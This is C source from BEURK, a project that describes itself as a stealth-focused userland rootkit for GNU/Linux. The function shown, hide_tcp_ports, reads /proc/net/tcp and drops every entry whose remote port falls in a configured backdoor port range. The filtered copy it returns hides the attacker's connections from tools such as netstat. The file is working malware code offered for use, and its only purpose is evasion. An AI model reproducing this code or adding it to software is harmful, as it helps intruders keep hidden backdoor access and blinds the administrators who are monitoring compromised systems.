/*
 * BEURK is an userland rootkit for GNU/Linux, focused around stealth.
 * Copyright (C) 2015  unix-thrust
 *
 * This file is part of BEURK.
 *
 * BEURK is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * BEURK is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <stdio.h> /* FILE, tmpfile(), fgets(), fclose(), rewind() */
#include <limits.h> /* LINE_MAX */
#include "beurk.h" /* prototype */
#include "config.h" /* PROC_NET_TCP, ... */
#include "debug.h" /* DEBUG() */

/** hide_tcp_port creates a dummy tmp file generated by removing
 * all entries we need to hide on our actual file.
 */

FILE                *hide_tcp_ports(const char *file) {
    init();
    DEBUG(D_INFO, "called hide_tcp_ports()");

    unsigned long   rxq, txq, time_len, retr, inode;
    int             local_port, rem_port, d, state, uid, timer_run, timeout;
    char            rem_addr[128], local_addr[128], more[512];
    char            line[LINE_MAX];
    FILE            *tmp = tmpfile();
    FILE            *pnt = REAL_FOPEN(file, "r");

    while (fgets(line, LINE_MAX, pnt)) {
        sscanf(line, SCANF_PROC_NET_TCP, &d, local_addr, &local_port,
                rem_addr, &rem_port, &state, &txq, &rxq, &timer_run,
                &time_len, &retr, &uid, &timeout, &inode, more);
        if (rem_port >= LOW_BACKDOOR_PORT && rem_port <= HIGH_BACKDOOR_PORT)
            continue;
        fputs(line, tmp);
    }
    fclose(pnt);
    rewind(tmp);
    return (tmp);
}
